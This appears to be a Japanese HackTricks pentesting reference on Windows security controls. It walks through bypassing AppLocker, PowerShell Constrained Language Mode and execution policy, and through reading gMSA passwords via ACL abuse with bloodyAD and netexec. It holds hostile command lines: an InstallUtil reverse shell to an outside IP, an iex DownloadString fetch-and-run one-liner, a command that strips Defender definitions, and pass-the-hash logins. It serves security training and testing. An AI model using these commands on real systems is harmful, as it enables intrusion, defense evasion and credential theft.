# Windows セキュリティ制御

{{#include ../../banners/hacktricks-training.md}}

## AppLocker ポリシー

アプリケーションのホワイトリストとは、システム上に存在し、実行を許可する承認済みソフトウェアアプリケーションまたは実行ファイルの一覧です。その目的は、組織固有のビジネスニーズに合わない有害なマルウェアや未承認ソフトウェアから環境を保護することです。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) は Microsoft の**アプリケーションホワイトリストソリューション**であり、システム管理者は**ユーザーが実行できるアプリケーションやファイル**を制御できます。実行ファイル、スクリプト、Windows インストーラーファイル、DLL、パッケージアプリ、パッケージアプリのインストーラーを**詳細に制御**できます。\
組織では、**cmd.exe と PowerShell.exe をブロック**し、特定のディレクトリへの書き込みアクセスを制限することがよくありますが、**これらはすべて回避できます**。

### 確認

ブラックリストまたはホワイトリストに登録されているファイルや拡張子を確認します。

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

このレジストリパスには、AppLocker が適用する設定とポリシーが含まれており、システム上で現在適用されているルールを確認できます。

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### バイパス

- AppLocker ポリシーをバイパスするのに便利な**書き込み可能なフォルダー**: AppLocker によって `C:\Windows\System32` または `C:\Windows` 内の任意のファイルの実行が許可されている場合、**書き込み可能なフォルダー**を利用して**バイパス**できます。

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- 一般的に**信頼されている**[**「LOLBAS」**](https://lolbas-project.github.io/)のバイナリも、AppLockerの回避に役立つことがあります。
- **不適切に記述されたルールも回避できる場合があります**
  - たとえば、**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**の場合、任意の場所に**`allowed`という名前のフォルダー**を作成すれば、許可されます。
  - 組織は、**`%System32%\WindowsPowerShell\v1.0\powershell.exe`実行ファイル**のブロックに注力する一方で、`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`や`PowerShell_ISE.exe`など、ほかの[**PowerShell実行ファイルの場所**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)を見落としがちです。
- **DLL enforcementは、システムへの負荷が増えることや、問題が起きないことを確認するために必要なテスト量を理由に、有効化されることはほとんどありません。**そのため、**DLLをbackdoorとして使うとAppLockerを回避できます**。
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)または[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)を使えば、任意のプロセス内で**Powershell**コードを**実行**し、AppLockerを回避できます。詳しくは、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)を参照してください。<sup>[[4]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

ローカルの認証情報はこのファイルに保存され、パスワードはハッシュ化されています。

### Local Security Authority (LSA) - LSASS

シングルサインオンのため、このサブシステムの**メモリ**には**認証情報**（ハッシュ化済み）が**保存**されます。\
**LSA**はローカルの**セキュリティポリシー**（パスワードポリシー、ユーザー権限など）、**認証**、**アクセストークン**などを管理します。\
ローカルログインの場合、**SAM**ファイル内の入力された認証情報を**確認**し、ドメインユーザーの認証では**ドメインコントローラー**と**通信**するのがLSAです。

**認証情報**は**LSASSプロセス**内に**保存**されます。Kerberosチケット、NTおよびLMハッシュ、簡単に復号できるパスワードなどが含まれます。

### LSA secrets

LSAは一部の認証情報をディスクに保存することがあります。

- Active Directoryのコンピューターアカウントのパスワード（到達不能なドメインコントローラー）。
- Windowsサービスのアカウントのパスワード
- スケジュールされたタスクのパスワード
- その他（IISアプリケーションのパスワードなど）

### NTDS.dit

これはActive Directoryのデータベースです。ドメインコントローラーにのみ存在します。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender)は、Windows 10およびWindows 11と、一部のWindows Serverバージョンで利用できるアンチウイルスです。**`WinPEAS`**などの一般的なpentestingツールを**ブロック**します。ただし、これらの**保護を回避する方法**があります。

### Check

**Defender**の**状態**を確認するには、PS cmdletの**`Get-MpComputerStatus`**を実行します（有効かどうかは**`RealTimeProtectionEnabled`**の値で確認できます）。

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

列挙するには、次のコマンドも実行できます。

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypted File System (EFS)

EFSは、**File Encryption Key (FEK)** と呼ばれる**対称鍵**を使用してファイルを暗号化し、保護します。この鍵はユーザーの**公開鍵**で暗号化され、暗号化されたファイルの $EFS **代替データストリーム**内に保存されます。復号が必要な場合は、ユーザーのデジタル証明書に対応する**秘密鍵**を使用して、$EFSストリームからFEKを復号します。詳しくは[こちら](https://en.wikipedia.org/wiki/Encrypting_File_System)を参照してください。

**ユーザーの操作なしで復号されるシナリオ**には、次のものがあります。

- ファイルやフォルダーが[FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)のような非EFSファイルシステムに移動されると、自動的に復号されます。
- SMB/CIFSプロトコルを介してネットワーク経由で送信される暗号化ファイルは、送信前に復号されます。

この暗号化方式では、所有者は暗号化ファイルに**透過的にアクセス**できます。ただし、所有者のパスワードを変更してログインするだけでは、復号できません。

**重要なポイント**:

- EFSは対称FEKを使用し、ユーザーの公開鍵で暗号化します。
- 復号にはユーザーの秘密鍵を使用してFEKにアクセスします。
- FAT32へのコピーやネットワーク経由の送信など、特定の条件下で自動的に復号されます。
- 所有者は追加の操作なしで暗号化ファイルにアクセスできます。

### EFS情報の確認

このパスが存在するか確認して、**ユーザー**がこの**サービスを使用したことがあるか**確認します:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

cipher /c \<file\> を使って、ファイルに**アクセスできるユーザー**を確認します\
フォルダー内で `cipher /e` と `cipher /d` を使うと、すべてのファイルを**暗号化**および**復号**することもできます。

### EFSファイルの復号

#### Authority Systemとして実行する

この方法では、**被害者ユーザー**がホスト上で**プロセス**を実行中である必要があります。その場合、`meterpreter` セッションを使用して、ユーザーのプロセスのトークンを偽装できます（`incognito` の `impersonate_token`）。または、ユーザーのプロセスに `migrate` するだけでも可能です。

#### ユーザーのパスワードを知っている場合

Mimikatzには、ユーザーの証明書/秘密鍵の情報をインポートし、パスワードが分かっている場合にEFSで保護されたファイルを復号する方法が記載されています。<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoftは、ITインフラストラクチャにおけるサービスアカウントの管理を簡素化するため、**Group Managed Service Accounts (gMSA)**を開発しました。「**パスワードを無期限にする**」設定が有効になっていることが多い従来のサービスアカウントとは異なり、gMSAはより安全で管理しやすいソリューションを提供します。

- **パスワードの自動管理**: gMSAでは、ドメインまたはコンピューターのポリシーに従って自動的に変更される、複雑な240文字のパスワードを使用します。この処理はMicrosoftのKey Distribution Service (KDC)が行うため、手動でパスワードを更新する必要はありません。
- **セキュリティの強化**: これらのアカウントはロックアウトされず、対話型ログインにも使用できないため、セキュリティが強化されます。
- **複数ホストへの対応**: gMSAは複数のホストで共有できるため、複数のサーバーで実行されるサービスに最適です。
- **スケジュールされたタスクへの対応**: managed service accountとは異なり、gMSAはスケジュールされたタスクの実行をサポートします。
- **SPN管理の簡素化**: コンピューターのsAMaccount情報またはDNS名が変更されると、システムがService Principal Name (SPN)を自動的に更新するため、SPN管理が簡素化されます。

gMSAのパスワードはLDAPプロパティ _**msDS-ManagedPassword**_ に保存され、Domain Controller (DC)によって30日ごとに自動的にリセットされます。このパスワードは、[MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)として知られる暗号化されたデータblobであり、許可された管理者とgMSAがインストールされているサーバーのみが取得できます。これにより、安全な環境が保たれます。この情報にアクセスするには、LDAPSなどのセキュアな接続を使用するか、「Sealing & Secure」で認証された接続が必要です。

![gMSAパスワードを取得するためのNTLM認証のリレー](../../images/asd1.png)<sup>[[1]](#references)</sup>

このパスワードは[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**で読み取れます。<sup>[[2]](#references)</sup>

```
/GMSAPasswordReader --AccountName jkohler
```

[**アーカイブされた元の研究で詳細を確認**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)。<sup>[[1]](#references)</sup>

同じ研究では、リレーされたプリンシパルに `msDS-ManagedPassword` の読み取り権限がある場合、**NTLM relay attack** で **gMSA password** を取得できることを説明しています。<sup>[[1]](#references)</sup>

### ACL chaining を悪用した gMSA managed password の読み取り（GenericAll -> ReadGMSAPassword）

多くの環境では、設定ミスのあるオブジェクト ACL を悪用することで、低権限ユーザーが DC を侵害せずに gMSA secrets へアクセスできます。<sup>[[3]](#references)</sup>

- 自分が制御できるグループ（例：GenericAll/GenericWrite 経由）に、gMSA に対する `ReadGMSAPassword` が付与されている。
- そのグループに自分を追加すると、LDAP 経由で gMSA の `msDS-ManagedPassword` blob を読み取る権限を継承し、利用可能な NTLM credentials を導出できる。

一般的な手順：

1) BloodHound で経路を特定し、足掛かりとなるプリンシパルを Owned に設定します。次のようなエッジを探します。
   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) 自分が制御できる中間グループに自分を追加します（bloodyAD を使った例）：

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) LDAP経由でgMSAの管理パスワードを読み取り、NTLMハッシュを導出します。NetExecは`msDS-ManagedPassword`の抽出とNTLMへの変換を自動化します。

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) NTLM hashを使用してgMSAとして認証します（平文は不要）。アカウントが Remote Management Users に所属している場合、WinRMを直接使用できます：

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

メモ:
- `msDS-ManagedPassword` の LDAP 読み取りには sealing（例: LDAPS/sign+seal）が必要です。ツールはこれを自動的に処理します。
- gMSA には WinRM などのローカル権限が付与されていることがよくあります。横展開を計画する際は、グループメンバーシップ（例: Remote Management Users）を確認してください。
- 自分で NTLM を計算するために blob だけが必要な場合は、MSDS-MANAGEDPASSWORD_BLOB structure を参照してください。

別の ACL 経路として、gMSA オブジェクト自体への書き込み権限があります。`msDS-GroupMSAMembership` は、どの principal が管理対象パスワードを取得できるかを決定するために使われる security descriptor です。その schema GUID は `888eedd6-ce04-df40-b462-b8a50e41ba38` です。自分が制御するグループに対する、この属性への正確な `WriteProperty` ACE は、読み取り可能な principal のリストを変更する候補となり得ます。これは、すでに読み取り可能な principal として登録されていることとは異なります。この経路が利用可能と判断する前に、完全な DACL、deny ACE と継承された ACE、および実効権限を確認してください。グループメンバーシップを新たに追加した場合は、パスワードの読み取りを試みる前に、トークンまたはセッションを更新する必要もあります。<sup>[[7]](#references)</sup>



## LAPS

**Local Administrator Password Solution (LAPS)** は、[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) からダウンロードでき、ローカル Administrator パスワードを管理できます。これらのパスワードは**ランダムに生成**され、各端末で異なり、**定期的に変更**され、Active Directory に一元的に保存されます。これらのパスワードへのアクセスは、認可されたユーザーに限定する ACL によって制限されています。十分な権限が付与されている場合、ローカル admin パスワードを読み取ることができます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell の[**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)は、PowerShell を効果的に使用するために必要な多くの機能を**制限します**。たとえば、COM オブジェクトをブロックし、承認済みの .NET 型、XAML ベースのワークフロー、PowerShell クラスなどのみを許可します。

### **確認**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

現在のWindowsバージョンではこのbypassは機能しませんが、[**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)を使えます。\
**コンパイルするには、** **場合によっては** _**参照を追加**_ -> _参照_ ->_参照_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll`を追加し、**プロジェクトを.Net4.5に変更する必要があります**。

#### 直接 bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用すると、任意のプロセス内で **Powershell** コードを実行し、constrained mode を回避できます。詳しくは、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode) を確認してください。<sup>[[4]](#references)</sup>

## PS Execution Policy

デフォルトでは **restricted** に設定されています。このポリシーを回避する主な方法は次のとおりです。

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

詳細は[こちら](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>を参照してください。

## Security Support Provider Interface (SSPI)

ユーザーの認証に使用できるAPIです。

SSPIは、通信する2台のマシンに適切な認証プロトコルを選択します。利用可能な場合はKerberosが優先されます。これらのプロトコルはSecurity Support Provider (SSP)によって実装され、Windows上ではDLLとしてインストールされます。ネゴシエートされたプロバイダーは、両方の通信相手がサポートしている必要があります。

### 主なSSP

- **Kerberos**: 優先されるプロトコル
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1**および**NTLMv2**: 互換性のため
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: WebサーバーとLDAPで使用され、パスワードはMD5 hashの形式
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSLとTLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 使用するプロトコルをネゴシエートするために使用されます（KerberosまたはNTLM。デフォルトはKerberos）
  - %windir%\Windows\System32\lsasrv.dll

#### ネゴシエーションでは、複数の方式が提示される場合と、1つだけ提示される場合があります。

## UAC - ユーザーアカウント制御

[ユーザーアカウント制御 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)は、**権限昇格を伴う操作に対して同意を求めるプロンプトを表示する**機能です。


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [gMSAへのリレー – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: 権限チェーンを介したWinRMでのgMSA](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – AppLockerとPowerShell Constrained Language Modeのバイパス](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – PowerShell Execution Policyをバイパスする15の方法](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ EFSファイルの復号](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft - ms-DS-GroupMSAMembership属性](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
